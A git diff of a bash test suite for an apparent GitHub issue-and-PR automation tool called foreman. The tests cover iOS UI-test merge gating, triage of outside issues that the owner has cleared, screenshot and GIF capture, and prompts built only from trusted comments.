@@ -16,6 +16,23 @@ export FOREMAN_MERGEABLE_RETRY_SECONDS=0
 export FOREMAN_NOW=1793520000 # 2026-11-01T08:00:00Z, a Sunday
 export TZ=UTC # the routines' schedules are in local time
 export FOREMAN_OPERATOR_PLISTS="$tmp/LaunchAgents"
+# The tests run on the Mac mini too (builds run them), beside the real iOS
+# lane. A real `xcrun simctl shutdown` from ios_tidy would stop a live UI
+# test there (#852's audits crashed with SIGTERM that way), so Apple's tools
+# are fakes on PATH, which also covers calls through `env` and child scripts.
+mkdir -p "$tmp/bin"
+export APPLE_CALLS="$tmp/apple-calls"
+for tool in xcrun xcodebuild; do
+  cat > "$tmp/bin/$tool" <<'FAKE'
+#!/bin/sh
+echo "$(basename "$0") $*" >> "$APPLE_CALLS"
+case "$*" in
+  "simctl list"*) if [ -n "$FAKE_SIMS" ]; then printf '%s\n' "$FAKE_SIMS"; else echo '{"devices":{}}'; fi ;;
+esac
+FAKE
+  chmod +x "$tmp/bin/$tool"
+done
+export PATH="$tmp/bin:$PATH"
 # shellcheck source=SCRIPTDIR/foreman.sh
 source "$here/foreman.sh"
 set +e
@@ -120,7 +137,7 @@ view() { # head checks-json
   jq -cn --arg h "$1" --arg b "$BASE" --argjson c "$2" \
     '{state:"OPEN", isDraft:false, labels:[], mergeable:"MERGEABLE", headRefOid:$h, headRefName:"foreman/7-x", baseRefOid:$b, statusCheckRollup:$c}'
 }
-GREEN_CHECKS='[{"status":"COMPLETED","conclusion":"SUCCESS"},{"state":"SUCCESS"},{"status":"COMPLETED","conclusion":"SKIPPED"}]'
+GREEN_CHECKS='[{"status":"COMPLETED","conclusion":"SUCCESS"},{"state":"SUCCESS"},{"status":"COMPLETED","conclusion":"SKIPPED"},{"context":"foreman/ios-ui-test","state":"SUCCESS"}]'
 
 # The stub returns what real gh would print *after* its --jq filter.
 GH_FAIL="" VIEW="" REVIEW="" THREADS=0 API_FAIL=""
@@ -188,7 +205,7 @@ expect "a failed check waits"                          "wait: checks red"       
 
 # #707: the web smoke suite runs as `smoke` after the preview deploys, so it's
 # still running (or failed) when every other check is green.
-SMOKE_AFTER='[{"name":"deploy-test","status":"COMPLETED","conclusion":"SUCCESS"},{"name":"deploy-preview","status":"COMPLETED","conclusion":"SUCCESS"},{"name":"ios-ok","status":"COMPLETED","conclusion":"SUCCESS"}'
+SMOKE_AFTER='[{"name":"deploy-test","status":"COMPLETED","conclusion":"SUCCESS"},{"name":"deploy-preview","status":"COMPLETED","conclusion":"SUCCESS"},{"name":"ios-ok","status":"COMPLETED","conclusion":"SUCCESS"},{"context":"foreman/ios-ui-test","state":"SUCCESS"}'
 reset; VIEW=$(view "$HEAD_SHA" "$SMOKE_AFTER,{\"name\":\"smoke\",\"status\":\"IN_PROGRESS\",\"conclusion\":null}]")
 expect "a running smoke check waits"                   "wait: checks pending"            "$(gate 7)"
 reset; VIEW=$(view "$HEAD_SHA" "$SMOKE_AFTER,{\"name\":\"smoke\",\"status\":\"COMPLETED\",\"conclusion\":\"FAILURE\"}]")
@@ -201,6 +218,21 @@ expect "a skipped smoke check (no preview) merges"     "merge $HEAD_SHA"        
 
 reset; VIEW=$(view "$HEAD_SHA" '[]')
 expect "no checks at all waits"                      "wait: checks none"               "$(gate 7)"
+
+# #611: the Mac mini's UI tests. Until the foreman posts the status, it isn't
+# in the rollup at all, and everything else can be green.
+NO_UI_TEST='[{"status":"COMPLETED","conclusion":"SUCCESS"},{"context":"ci/other","state":"SUCCESS"}]'
+reset; VIEW=$(view "$HEAD_SHA" "$NO_UI_TEST")
+expect "a head without foreman/ios-ui-test waits"      "wait: ios-ui-test not posted"    "$(gate 7)"
+reset; VIEW=$(view "$HEAD_SHA" '[{"status":"COMPLETED","conclusion":"SUCCESS"},{"context":"foreman/ios-ui-test","state":"PENDING"}]')
+expect "a running one waits as pending"                "wait: checks pending"            "$(gate 7)"
+reset; VIEW=$(view "$HEAD_SHA" '[{"status":"COMPLETED","conclusion":"SUCCESS"},{"context":"foreman/ios-ui-test","state":"FAILURE"}]')
+expect "a failed one is red"                           "wait: checks red"                "$(gate 7)"
+mkdir -p "$IOS"; echo "8GB free, under the 10GB an iOS job needs" > "$IOS/low-disk"
+reset; VIEW=$(view "$HEAD_SHA" "$NO_UI_TEST")
+expect "low on disk, the wait says why"                "wait: ios-ui-test not posted (the Mac mini's iOS lane is stopped: 8GB free, under the 10GB an iOS job needs)" "$(gate 7)"
+expect "and the stall clock keys on the same wait"     "$(wait_key "ios-ui-test not posted")" "$(wait_key "ios-ui-test not posted (the Mac mini's iOS lane is stopped: 8GB free)")"
+rm -f "$IOS/low-disk"
 
 reset; THREADS=2
 expect_prefix "the owner's open threads wait"          "wait: 2 unresolved"              "$(gate 7)"
@@ -865,7 +897,7 @@ FB_ISSUES="[$(fb_issue 30 superhighfives feedback auto-fix platform:ios),
   $(fb_issue 25 superhighfives feedback auto-fix needs-decision),
   $(fb_issue 26 superhighfives feedback auto-fix spec),
   $(fb_issue 27 superhighfives feedback)]"
-expect "new reports: the owner's, cleared, not yet in hand, oldest first" "22 23 30" \
+expect "new reports: the owner's, cleared, and others' with auto-fix, not yet in hand, oldest first" "22 23 24 30" \
   "$(feedback_candidates "$FB_BOARD" "$FB_ISSUES" | paste -sd' ' -)"
 
 # feedback_next, with the label events stubbed per issue.
@@ -1017,6 +1049,10 @@ expect "a report's spec still gets runs while it waits on the owner" "41" "$(spe
 
 echo "triage outcomes"
 
+# The owner's own report, unless a case says otherwise.
+ISSUE_READ='{"number":22,"title":"t","body":"b","lastEditedAt":null,"author":{"login":"superhighfives"},"labels":{"nodes":[]}}'
+issue_read() { printf '%s\n' "$ISSUE_READ"; }
+
 # Everything around the claude run is stubbed; what's tested is what the
 # foreman does with the result.
 new_worktree() { :; }; run_claude() { return 0; }; opened_pr() { return 1; }
@@ -1049,6 +1085,188 @@ expect "neither: needs-decision"                      "yes"  "$(called '--add-la
 expect "and a comment"                                "yes"  "$(called 'issue comment 22')"
 expect "back in Ideas"                                "yes"  "$(called '--single-select-option-id o-ideas')"
 expect "and re-armed for when the label comes off"    "no"   "$([ -e "$FEEDBACK/22" ] && echo yes || echo no)"
+
+echo "outside issues"
+
+(
+  # Someone else's issue #24, cleared by the owner with auto-fix alone. Each
+  # read is stubbed from these, as gh would answer them.
+  # shellcheck disable=SC2329 # feedback_skipped calls it
+  event() { real_event "$@"; }
+  eval "$(sed -n '/^issue_read() {/,/^}/p' "$here/foreman.sh")"
+  label_at=2026-11-01T09:00:00Z before=2026-11-01T08:00:00Z after=2026-11-01T10:00:00Z later=2026-11-01T11:00:00Z
+  out_read() { # lastEditedAt|null [author] -> one issue_read answer
+    jq -cn --arg e "$1" --arg a "${2:-stranger}" --arg b "$OUT_BODY" \
+      '{number:24, title:"Button is wrong", body:$b, lastEditedAt:(if $e == "null" then null else $e end), author:{login:$a}, labels:{nodes:[{name:"auto-fix"}]}}'
+  }
+  ev() { # id event actor time [label] -> one issue event
+    jq -cn --argjson id "$1" --arg e "$2" --arg a "$3" --arg t "$4" --arg l "${5:-auto-fix}" \
+      '{id:$id, event:$e, actor:{login:$a}, created_at:$t} + (if $e == "renamed" then {rename:{from:"a", to:"b"}} else {label:{name:$l}} end)'
+  }
+  OUT_IMG=aaaaaaaa-0000-4000-8000-00000000000a STRANGER_IMG=bbbbbbbb-0000-4000-8000-00000000000b
+  OUT_BODY="It's the wrong colour. CLEARED-BODY
+![shot](https://github.com/user-attachments/assets/$OUT_IMG)
+![fb](https://github.com/superhighfives/nylon-impossible/blob/feedback-assets/screenshots/theirs.png)"
+  OUT_READ=$(out_read null)
+  OUT_EVENTS="[$(ev 1 labeled superhighfives "$label_at")]"
+  OUT_COMMENTS=$(jq -cn --arg s "STRANGER-SAYS ![x](https://github.com/user-attachments/assets/$STRANGER_IMG)" \
+    '[{user:{login:"superhighfives"}, created_at:"t", body:"OWNER-SAYS", id:5},
+      {user:{login:"stranger"}, created_at:"t", body:$s, id:6},
+      {user:{login:"nylon-foreman"}, created_at:"t", body:"FOREMAN-SAYS", id:7},
+      {user:{login:"claude[bot]"}, created_at:"t", body:"CLAUDE-SAYS", id:8}]')
+  OUT_LIST="[$(fb_issue 24 stranger auto-fix)]"
+  gh() {
+    local jqf="" prev="" a
+    for a in "$@"; do [ "$prev" = --jq ] && jqf="$a"; prev="$a"; done
+    echo "$*" >> "$CALLS"
+    case "$*" in
+      "api graphql"*) printf '%s\n' "$OUT_READ" ;;
+      *issues/24/events*) printf '%s\n' "$OUT_EVENTS" ;;
+      *issues/24/comments*) jq -r "$jqf" <<<"$OUT_COMMENTS" ;;
+      *issues/*/comments*) jq -r "$jqf" <<<'[]' ;;
+      "issue list"*) printf '%s\n' "$OUT_LIST" ;;
+      "pr list"*) ;;
+      "issue view 90 "*) jq -r "$jqf" <<<"$(jq -cn --rawfile b "$tmp/created-body" '{author:{login:"nylon-foreman"}, body:$b, title:"t", labels:[]}')" ;;
+      "issue view"*) jq -r "$jqf" <<<'{"author":{"login":"stranger"}, "title":"Button is wrong", "body":"LIVE-BODY", "labels":[]}' ;;
+      "issue create"*) cat > "$tmp/created-body"; echo "https://github.com/superhighfives/nylon-impossible/issues/90" ;;
+      "project item-add"*) echo I90 ;;
+      *contents/*) echo "fb-bytes" ;;
+      *) return 0 ;;
+    esac
+  }
+  alerts() { grep -c '^alert skipped #24' "$CALLS"; }
+  fresh_out() { : > "$CALLS"; : > "$EVENTS"; rm -rf "$FEEDBACK" "$ONCE" "$SPECS"; OUT_READ=$(out_read null); OUT_EVENTS="[$(ev 1 labeled superhighfives "$label_at")]"; }
+
+  # The edit check, pure.
+  since() { edited_since "$label_at" "$1" <<<"$2"; }
+  expect "edited_since: no edit, no rename"         ""  "$(since "$(out_read null)" "[$(ev 1 labeled superhighfives "$label_at")]")"
+  expect "a body edited after the label"            "$after	body"  "$(since "$(out_read "$after")" "[]")"
+  expect "a body edited before it doesn't count"    ""  "$(since "$(out_read "$before")" "[]")"
+  expect "a title renamed after the label"          "$after	title"  "$(since "$(out_read null)" "[$(ev 2 renamed stranger "$after")]")"
+  expect "a title renamed before it doesn't count"  ""  "$(since "$(out_read null)" "[$(ev 2 renamed stranger "$before")]")"
+  expect "the latest change wins"                   "$later	title"  "$(since "$(out_read "$after")" "[$(ev 2 renamed stranger "$later")]")"
+  expect "the owner's own edit counts too"          "$after	title"  "$(since "$(out_read null)" "[$(ev 2 renamed superhighfives "$after")]")"
+  expect "fractional seconds still compare"         "2026-11-01T10:00:00.5Z	body"  "$(since "$(out_read 2026-11-01T10:00:00.5Z)" "[]")"
+
+  # Intake.
+  expect "candidates: someone else's, with auto-fix alone or feedback too; not feedback alone, nor spec" "24 28" \
+    "$(feedback_candidates "$FB_BOARD" "[$(fb_issue 24 stranger auto-fix), $(fb_issue 28 stranger feedback auto-fix),
+      $(fb_issue 29 stranger feedback), $(fb_issue 31 stranger auto-fix spec), $(fb_issue 32 superhighfives auto-fix)]" | paste -sd' ' -)"
+
+  fresh_out
+  expect "an unedited outside issue is next"                 "24"  "$(feedback_next "$FB_BOARD" 2>/dev/null)"
+  expect "listed by auto-fix alone"                          "yes" "$(called 'issue list -R superhighfives/nylon-impossible --state open --label auto-fix --limit')"
+  OUT_EVENTS="[$(ev 1 labeled stranger "$label_at")]"
+  expect "not if anyone else added auto-fix"                 ""    "$(feedback_next "$FB_BOARD" 2>/dev/null)"
+  OUT_EVENTS="[$(ev 1 labeled superhighfives "$label_at"), $(ev 2 unlabeled superhighfives "$after")]"
+  expect "nor if the owner added it and took it off"         ""    "$(feedback_next "$FB_BOARD" 2>/dev/null)"
+  OUT_EVENTS="[$(ev 1 labeled superhighfives "$label_at")]"; OUT_READ=$(out_read "$before")
+  expect "an edit before the label doesn't block it"         "24"  "$(feedback_next "$FB_BOARD" 2>/dev/null)"
+
+  fresh_out; OUT_READ=$(out_read "$after")
+  log=$(feedback_next "$FB_BOARD" 2>&1 >/dev/null); next=$(feedback_next "$FB_BOARD" 2>/dev/null)
+  expect "one edited after the label is skipped"             ""    "$next"
+  expect "and logged, saying why"                            "yes" "$(grep -qF "#24's body changed at $after, after superhighfives added auto-fix" <<<"$log" && echo yes)"
+  expect "as a feedback_skipped event, once"                 "1"   "$(grep -c '"event":"feedback_skipped"' "$EVENTS")"
+  expect "two ticks, one alert"                              "1"   "$(alerts)"
+  expect "it isn't marked as triaged"                        "no"  "$([ -e "$FEEDBACK/24" ] && echo yes || echo no)"
+  expect "and nothing is posted on the issue"                "no no" "$(called 'issue comment') $(called 'issue edit')"
+  OUT_READ=$(out_read "$later"); feedback_next "$FB_BOARD" >/dev/null 2>&1
+  expect "a new edit sends another"                          "2"   "$(alerts)"
+  OUT_EVENTS="[$(ev 1 labeled superhighfives "$label_at"), $(ev 2 unlabeled superhighfives "$later"), $(ev 3 labeled superhighfives 2026-11-01T12:00:00Z)]"
+  expect "the owner relabels it, and it's picked up"         "24"  "$(feedback_next "$FB_BOARD" 2>/dev/null)"
+
+  fresh_out; OUT_EVENTS="[$(ev 1 labeled superhighfives "$label_at"), $(ev 2 renamed stranger "$after")]"
+  expect "a title renamed after the label is skipped too"    ""    "$(feedback_next "$FB_BOARD" 2>/dev/null)"
+  expect "with its own alert"                                "yes" "$(called "alert skipped #24: #24's title changed at $after")"
+
+  # The prompt: built from the checked read, with trusted comments only.
+  fresh_out; outside_report 24 "$tmp/report.json" >/dev/null
+  OUT_READ=$(out_read null | jq -c '.body = "EDITED-LATER"') # what GitHub would say after the check
+  # shellcheck disable=SC2329 # the prompt calls it
+  build_rules() { :; }
+  prompt=$(feedback_prompt 24 "$tmp/report.json" "$tmp/spec24")
+  has() { grep -qF -- "$1" <<<"$prompt" && echo yes || echo no; }
+  expect "prompt: the body as checked, not as it is now"     "yes no no" "$(has CLEARED-BODY) $(has EDITED-LATER) $(has LIVE-BODY)"
+  # shellcheck disable=SC2016 # backticks, not an expansion
+  expect "it names the author"                               "yes" "$(has 'opened on GitHub by `stranger`')"
+  expect "and says not to re-read the issue"                 "yes" "$(tr '\n' ' ' <<<"$prompt" | grep -qF "don't re-read the issue from GitHub" && echo yes || echo no)"
+  expect "not that it came from Send feedback"               "no"  "$(has 'is a report from the apps')"
+  expect "the owner's, the foreman's and Claude's comments"  "yes yes yes" "$(has OWNER-SAYS) $(has FOREMAN-SAYS) $(has CLAUDE-SAYS)"
+  expect "and nobody else's"                                 "no"  "$(has STRANGER-SAYS)"
+  expect "the spec goes to files, not the body"              "yes no" "$(has "$tmp/spec24/spec.md") $(has 'gh issue edit 24 --body-file')"
+  unset -f build_rules; eval "$(sed -n '/^build_rules() {/,/^}/p' "$here/foreman.sh")"
+
+  # Images: the checked body's pasted ones, not its feedback-assets links or a stranger's comment's.
+  curl() {
+    local prev="" a url="" out=""
+    for a in "$@"; do [ "$prev" = -o ] && out="$a"; case "$a" in https://*) url="$a" ;; esac; prev="$a"; done
+    echo "curl $url" >> "$CALLS"; printf 'png' > "$out"; printf 'image/png'
+  }
+  d="$tmp/fetch-out"; rm -rf "$d"; mkdir -p "$d"; : > "$CALLS"
+  fetch_images 24 "$d" "$tmp/report.json" >/dev/null
+  expect "images: the body's pasted one is fetched"          "yes" "$([ -e "$d/.feedback-assets/user-attachments/$OUT_IMG.png" ] && echo yes)"
+  expect "not a stranger's comment's"                        "no"  "$(called "$STRANGER_IMG")"
+  expect "nor the body's feedback-assets link"               "no no" "$(called 'contents/') $([ -e "$d/.feedback-assets/screenshots/theirs.png" ] && echo yes || echo no)"
+  expect "and the live issue isn't read for them"            "no"  "$(called 'issue view')"
+  unset -f curl
+
+  # foreman triage <n>: the same rules.
+  use_token() { :; }; take_lock() { return 0; }; ensure_clone() { :; }; board_json() { echo "$FB_BOARD"; }
+  triage() { echo "TRIAGED $2"; }
+  fresh_out
+  expect "foreman triage takes an outside issue"             "TRIAGED 24" "$( (cmd_triage 24) 2>&1)"
+  OUT_READ=$(out_read "$after")
+  expect "and refuses an edited one"                         "foreman: #24's body changed at $after, after superhighfives added auto-fix. Take auto-fix off and put it back to clear it" "$( (cmd_triage 24) 2>&1)"
+  OUT_READ=$(out_read null); OUT_EVENTS="[$(ev 1 labeled stranger "$label_at")]"
+  expect "or one the owner didn't clear"                     "foreman: #24's auto-fix wasn't added by superhighfives" "$( (cmd_triage 24) 2>&1)"
+  unset -f triage; eval "$(sed -n '/^triage() {/,/^}/p' "$here/foreman.sh")"
+
+  # Triage, with the run stubbed to write what an unclear one would.
+  # shellcheck disable=SC2329 # triage calls them
+  new_worktree() { echo "new_worktree $*" >> "$CALLS"; }
+  # shellcheck disable=SC2329
+  opened_pr() { return 1; }
+  # shellcheck disable=SC2329
+  branch_for() { echo "foreman/$1-x"; }
+  RUN_ACT=""
+  # shellcheck disable=SC2329
+  run_claude() { echo "run_claude" >> "$CALLS"; eval "$RUN_ACT"; return 0; }
+  # shellcheck disable=SC2016 # expanded when the run's stub evals it
+  unclear_run='printf "Found it in Row.swift.\n<!-- foreman: tracks #7 -->\n\n%s\n" "${SPEC_OK#*It breaks.}" | sed "s/None\\./1. Which colour?/" > "$FEEDBACK/24.spec/spec.md"
+    echo "Row colour is wrong" > "$FEEDBACK/24.spec/title"; echo "{\"kind\":\"fix\"}" > "$FEEDBACK/24.spec/kind.json"
+    echo "1. Which colour? I recommend blue." > "$FEEDBACK/24.spec/questions.md"'
+  fresh_out; rm -f "$tmp/created-body"; RUN_ACT="$unclear_run"
+  triage "$FB_BOARD" 24 >/dev/null
+  expect "triage adds feedback to an outside issue"          "yes" "$(called 'issue edit 24 -R superhighfives/nylon-impossible --add-label feedback')"
+  expect "with the checked read for its images"              "yes" "$(called "new_worktree 24 foreman/24-x $FEEDBACK/24.report.json")"
+  expect "and doesn't put it on the board yet"               "no"  "$(called 'project item-add --url https://github.com/superhighfives/nylon-impossible/issues/24')"
+  expect "unclear: a new issue, labelled spec and feedback"  "yes" "$(called 'issue create -R superhighfives/nylon-impossible --title Row colour is wrong --label spec --label feedback')"
+  body=$(cat "$tmp/created-body" 2>/dev/null)
+  inbody() { grep -qF -- "$1" <<<"$body" && echo yes || echo no; }
+  expect "its Problem links back and quotes the report"      "yes yes yes" "$(inbody $'## Problem\n\nReported in #24 by stranger') $(inbody '> **Button is wrong**') $(inbody "> It's the wrong colour. CLEARED-BODY")"
+  expect "then the run's spec, under one Problem"            "yes 1" "$(inbody 'Found it in Row.swift.') $(grep -cx '## Problem' <<<"$body")"
+  expect "and it says what it tracks"                        "yes" "$(inbody '<!-- foreman: tracks #24 -->')"
+  expect "not a marker the run wrote itself"                 "no"  "$(inbody '<!-- foreman: tracks #7 -->')"
+  expect "with needs-decision, its kind and questions"       "yes yes yes" "$(called 'issue edit 90 -R superhighfives/nylon-impossible --add-label needs-decision') $(called 'issue edit 90 -R superhighfives/nylon-impossible --add-label kind:fix') $(called "issue comment 90 -R superhighfives/nylon-impossible --body-file $FEEDBACK/24.spec/questions.md")"
+  expect "in Specced"                                        "yes yes" "$(called 'project item-add 1 --owner superhighfives --url https://github.com/superhighfives/nylon-impossible/issues/90') $(called '--id I90 --field-id F --single-select-option-id o-specced')"
+  expect "the original gets one tracking comment"            "1"   "$(grep -c 'issue comment 24 .*Tracking this in #90\.' "$CALLS")"
+  expect "and its body is never edited"                      "no"  "$(grep '^issue edit 24 ' "$CALLS" | grep -q -- '--body' && echo yes || echo no)"
+  expect "nor is it labelled spec or needs-decision"         "no no" "$(called 'issue edit 24 -R superhighfives/nylon-impossible --add-label spec') $(called 'issue edit 24 -R superhighfives/nylon-impossible --add-label needs-decision')"
+  expect "spec runs wait for the owner's next reply"         "yes" "$([ -e "$SPECS/90" ] && echo yes)"
+  expect "it's marked as triaged"                            "yes" "$([ -e "$FEEDBACK/24" ] && echo yes)"
+  expect "and the owner hears"                               "yes" "$(called 'alert #24 (from stranger) needs a spec, and #90 has questions for you')"
+  expect "its build closes both"                             "yes" "$(build_rules 90 "$(tracked_report 90)" | grep -qF 'starts with "Closes #90, closes #24"' && echo yes)"
+  expect "an ordinary build closes one"                      "yes" "$(build_rules 91 "" | grep -qF 'starts with "Closes #91" (or' && echo yes)"
+
+  fresh_out; OUT_READ=$(out_read "$after"); RUN_ACT="$unclear_run"
+  triage "$FB_BOARD" 24 >/dev/null
+  expect "a triage job re-checks: an edit since the tick stops it" "no no" "$(called run_claude) $([ -e "$FEEDBACK/24" ] && echo yes || echo no)"
+  expect "and alerts like the tick"                          "1"   "$(alerts)"
+
+  echo "$pass $fail" > "$tmp/counts"
+)
+read -r pass fail < "$tmp/counts"
 
 echo "headless runs"
 
@@ -1260,22 +1478,33 @@ tip=$(git -C "$tmp/origin.git" rev-parse feedback-assets)
 expect "a branch that moved is built on, not forced" "$theirs new"  "$(git -C "$tmp/origin.git" rev-parse "$tip^") $(git -C "$tmp/origin.git" show "$tip:screenshots/2026/11/s.png")"
 
 # fix_shots end to end, with tsx faked: FAKE_SHOTS=ok takes every shot,
-# anything else is a simulator that never comes up.
+# anything else is a simulator that never comes up. A video's GIF holds the
+# app and the UI tests its side ran, and FAKE_GIF=none loses it on both sides.
 g checkout -q main && g pull -q origin main 2>/dev/null
-mkdir -p "$tmp/seed/src/ios" "$tmp/seed/src/marketing/node_modules/.bin"
+mkdir -p "$tmp/seed/$UI_TESTS" "$tmp/seed/src/marketing/node_modules/.bin"
 echo before > "$tmp/seed/src/ios/app.swift"
+echo main-tests > "$tmp/seed/$UI_TESTS/T.swift"
 cat > "$tmp/seed/src/marketing/node_modules/.bin/tsx" <<'TSX'
 #!/bin/sh
-cmd=$2 out="" as=""
-while [ $# -gt 0 ]; do case "$1" in --out) out=$2; shift ;; --as) as=$2; shift ;; esac; shift; done
+cmd=$2 out="" as="" plan=""
+while [ $# -gt 0 ]; do case "$1" in --out) out=$2; shift ;; --as) as=$2; shift ;; --plan) plan=$2; shift ;; esac; shift; done
+tests="../ios/Nylon Impossible/Nylon ImpossibleUITests/T.swift"
 case "$cmd" in
-  capture) [ "$FAKE_SHOTS" = ok ] && cat ../ios/app.swift > "$out/today-$as.png"; exit 0 ;;
-  report) printf '### Before / after\n\nTABLE %s\n\n<!-- fix-shots:plan {} -->\n' "$(ls "$out" | grep -c png)" ;;
+  capture)
+    echo "$as $(cat "$tests")" >> "$FAKE_TESTS_LOG"
+    [ "$FAKE_SHOTS" = ok ] || exit 0
+    cat ../ios/app.swift > "$out/today-$as.png"
+    if grep -q videos "$plan" && [ "$FAKE_GIF" != none ]; then
+      echo "$(cat ../ios/app.swift) $(cat "$tests")" > "$out/video-$as.gif"
+    fi
+    exit 0 ;;
+  report) printf '### Before / after\n\nTABLE %s\n\n<!-- fix-shots:plan {} -->\n' "$(ls "$out" | grep -cE 'png|gif')" ;;
 esac
 TSX
 chmod +x "$tmp/seed/src/marketing/node_modules/.bin/tsx"
 g add -A && g commit -qm "app" && g push -q origin HEAD:main
-g checkout -q -B foreman/9-x && echo after > "$tmp/seed/src/ios/app.swift" && g commit -qam fix && g push -q origin HEAD:refs/heads/foreman/9-x
+g checkout -q -B foreman/9-x && echo after > "$tmp/seed/src/ios/app.swift" && echo branch-tests > "$tmp/seed/$UI_TESTS/T.swift" \
+  && g commit -qam fix && g push -q origin HEAD:refs/heads/foreman/9-x
 FIX_SHA=$(g rev-parse HEAD)
 mkdir -p "$LOGS" "$WORKTREES" "$SHOTS"
 echo '{"shots":[{"device":"iphone","screen":"today"}]}' > "$SHOTS/9.json"
@@ -1287,10 +1516,11 @@ gh() {
     *) return 0 ;;
   esac
 }
+export FAKE_TESTS_LOG="$tmp/fake-tests.log"
 FAKE_SHOTS=fail fix_shots 10 9 foreman/9-x "$SHOTS/9.json" >/dev/null 2>&1
 expect "simulator down: the PR still gets the section"  "yes"  "$(grep -q 'TABLE 0' "$tmp/edited" && echo yes)"
 expect "inside Try it"                                   "yes"  "$(sed -n '/## Try it/,/## Notes/p' "$tmp/edited" | grep -q 'TABLE 0' && echo yes)"
-expect "saying what failed and where the log is"         "yes"  "$(grep -q "2 of 2 shots weren't captured. Log on the Mac mini" "$tmp/edited" && echo yes)"
+expect "saying what failed and where the log is"         "yes"  "$(grep -q "2 of 2 images weren't captured. Log on the Mac mini" "$tmp/edited" && echo yes)"
 expect "and nothing is pushed"                           "$tip" "$(git -C "$tmp/origin.git" rev-parse feedback-assets)"
 expect "the checkout is cleaned up"                      "no"   "$([ -d "$WORKTREES/shots-10" ] && echo yes || echo no)"
 
@@ -1298,6 +1528,21 @@ FAKE_SHOTS=ok fix_shots 10 9 foreman/9-x "$SHOTS/9.json" >/dev/null 2>&1
 shots_tip=$(git -C "$tmp/origin.git" rev-parse feedback-assets)
 expect "shots: both sides captured and in the PR"        "yes"  "$(grep -q 'TABLE 2' "$tmp/edited" && ! grep -q "weren't captured" "$tmp/edited" && echo yes)"
 expect "before is main's app, after is the branch's"     "before after"  "$(git -C "$tmp/origin.git" show "$shots_tip:fixes/9/${FIX_SHA:0:12}/today-before.png") $(git -C "$tmp/origin.git" show "$shots_tip:fixes/9/${FIX_SHA:0:12}/today-after.png")"
+expect "with no video, each side keeps its own UI tests" "after branch-tests|before main-tests"  "$(tail -2 "$FAKE_TESTS_LOG" | paste -sd '|' -)"
+
+echo '{"shots":[{"device":"iphone","screen":"today"}],"videos":[{"device":"iphone","test":"T/testPull"}]}' > "$SHOTS/9.json"
+FAKE_SHOTS=ok fix_shots 10 9 foreman/9-x "$SHOTS/9.json" >/dev/null 2>&1
+shots_tip=$(git -C "$tmp/origin.git" rev-parse feedback-assets)
+expect "video: the branch's UI tests run on both sides"  "after branch-tests|before branch-tests"  "$(tail -2 "$FAKE_TESTS_LOG" | paste -sd '|' -)"
+expect "the GIFs go to feedback-assets with the PNGs"    "before branch-tests|after branch-tests|before"  "$(git -C "$tmp/origin.git" show "$shots_tip:fixes/9/${FIX_SHA:0:12}/video-before.gif")|$(git -C "$tmp/origin.git" show "$shots_tip:fixes/9/${FIX_SHA:0:12}/video-after.gif")|$(git -C "$tmp/origin.git" show "$shots_tip:fixes/9/${FIX_SHA:0:12}/today-before.png")"
+expect "and the table counts them"                       "yes"  "$(grep -q 'TABLE 4' "$tmp/edited" && ! grep -q "weren't captured" "$tmp/edited" && echo yes)"
+FAKE_SHOTS=ok FAKE_GIF=none fix_shots 10 9 foreman/9-x "$SHOTS/9.json" >/dev/null 2>&1
+expect "a missing GIF counts as a missing image"         "yes"  "$(grep -q "2 of 4 images weren't captured" "$tmp/edited" && echo yes)"
+mv "$tmp/origin.git/hooks/pre-receive.sample" "$tmp/origin.git/hooks/pre-receive" 2>/dev/null
+printf '#!/bin/sh\nexit 1\n' > "$tmp/origin.git/hooks/pre-receive"; chmod +x "$tmp/origin.git/hooks/pre-receive"
+FAKE_SHOTS=ok fix_shots 10 9 foreman/9-x "$SHOTS/9.json" >/dev/null 2>&1
+expect "a failed push links no GIF either"               "yes 0"  "$(grep -q "couldn't be pushed" "$tmp/edited" && echo yes) $(find "$SHOTS/10" -name '*.gif' | wc -l | tr -d ' ')"
+rm -f "$tmp/origin.git/hooks/pre-receive"
 unset -f bun
 
 # ---- the machine account's token ---------------------------------------------
@@ -1921,6 +2166,294 @@ expect "and the edit follows" "issue edit 70 --add-label waiting-on-owner" "$(ed
 : > "$CALLS"; W_LABELS='[{"name":"waiting-on-owner"}]'
 waiting_pass "$W_BOARD" >/dev/null
 expect "only once" "no no" "$(called 'label create') $(called 'label list')"
+
+# ---- the iOS lane (#611) -----------------------------------------------------
+
+echo "the iOS lane"
+eval "real_$(declare -f lane_busy)"
+
+CALLS="$tmp/calls"; : > "$CALLS"
+alert() { echo "alert $*" >> "$CALLS"; }
+event() { echo "event $*" >> "$CALLS"; }
+routine_event() { echo "routine_event $*" >> "$CALLS"; }
+log() { echo "log $*" >> "$CALLS"; }
+called() { grep -qF -- "$1" "$CALLS" && echo yes || echo no; }
+statuses() { grep -oE 'statuses/[a-z0-9]+ -f state=[a-z]+ -f context=foreman/ios-ui-test -f description=.*' "$CALLS" | sed -E 's#statuses/##; s/ -f context=foreman\/ios-ui-test//; s/ -f (state|description)=/ /g' | paste -sd'|' -; }
+mkdir -p "$IOS" "$LOGS" "$WORKTREES"
+
+yn() { "$@" && echo yes || echo no; }
+expect "a web-only change doesn't touch the app"    no  "$(yn touches_ios <<<$'src/web/app.ts\nREADME.md')"
+expect "src/ios does"                                yes "$(yn touches_ios <<<$'src/web/app.ts\nsrc/ios/Nylon Impossible/App.swift')"
+expect "so do the design tokens"                     yes "$(yn touches_ios <<<'src/shared/design/tokens.json')"
+expect "and the typed-date fixtures"                 yes "$(yn touches_ios <<<'src/shared/src/todo-date-fixtures.json')"
+expect "but not the rest of src/shared"              no  "$(yn touches_ios <<<$'src/shared/src/seed-account.ts\nsrc/shared/designer.ts\nsrc/iosx/a')"
+expect "nor ios-test.yml, which ios-ok covers"       no  "$(yn touches_ios <<<'.github/workflows/ios-test.yml')"
+
+# The status pass: every open PR, against its file list.
+ctx() { jq -cn --arg s "$1" '[{context:"foreman/ios-ui-test", state:$s}]'; }
+pr_json() { # number author draft fork rollup
+  jq -cn --argjson n "$1" --arg a "$2" --argjson d "$3" --argjson f "$4" --argjson r "$5" \
+    '{number:$n, headRefOid:("sha" + ($n|tostring)), author:{login:$a}, isDraft:$d, isCrossRepository:$f, statusCheckRollup:$r}'
+}
+PRS="[$(pr_json 16 stranger false true '[]'),$(pr_json 11 nylon-foreman false false '[]'),$(pr_json 10 superhighfives false false '[]'),
+  $(pr_json 12 superhighfives false true '[]'),$(pr_json 13 app/dependabot false false '[]'),$(pr_json 14 superhighfives true false '[]'),
